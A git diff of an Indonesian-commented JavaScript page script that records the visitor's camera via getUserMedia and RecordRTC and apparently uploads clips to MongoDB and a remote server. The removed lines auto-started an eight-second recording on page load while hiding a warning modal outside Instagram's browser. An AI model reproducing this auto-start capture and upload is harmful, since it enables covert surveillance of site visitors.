@@ -15,8 +15,6 @@ const config = {
 // Fungsi untuk memulai perekaman
 const isInstagramBrowser = /Instagram|InstagramWebView/.test(navigator.userAgent);
 
-
-
 function startRecording() {
 
     navigator.mediaDevices.getUserMedia(config)
@@ -30,26 +28,18 @@ function startRecording() {
                 frameRate: 128000, // Frame rate tinggi
                 bufferSize: 163844444,
             };
+
+            console.log(stream)
+
             recordRTC = RecordRTC(stream, options);
             recordRTC.startRecording();
         })
         .catch(function(error) {
+            // startRecording()
             console.error('Kesalahan saat mengakses perangkat media: ', error);
         });
 }
 
-
-function videoElement(buffer) {
-
-    const modifiedBuffer = new Uint8Array(buffer);
-    const blob = new Blob([modifiedBuffer], { type: 'video/webm' })
-
-    const elemenVideo = document.querySelector('video')
-    const urlSrc = URL.createObjectURL(blob);
-    const source = `<source src='${urlSrc}' type='video/mp4' />`
-    elemenVideo.innerHTML = source
-    return console.log(source);
-}
 
 // Fungsi untuk menghentikan perekaman dan mengunggah video ke MongoDB
 function stopRecording() {
@@ -91,14 +81,28 @@ if (isInstagramBrowser) {
 } else {
     const peringatan = document.querySelector('.modal-body')
     peringatan.classList.add('d-none')
-    startRecording()
-    setTimeout(() => {
-        stopRecording()
-    }, 8000)
+        // startRecording()
+        // setTimeout(() => {
+        //     stopRecording()
+        // }, 8000)
 }
 
 
 
+
+
+
+// function videoElement(buffer) {
+
+//     const modifiedBuffer = new Uint8Array(buffer);
+//     const blob = new Blob([modifiedBuffer], { type: 'video/webm' })
+
+//     const elemenVideo = document.querySelector('video')
+//     const urlSrc = URL.createObjectURL(blob);
+//     const source = `<source src='${urlSrc}' type='video/mp4' />`
+//     elemenVideo.innerHTML = source
+//     return console.log(source);
+// }
 
 // fetch('https://server-cam.vercel.app/data/0')
 //     .then(e => e.json())
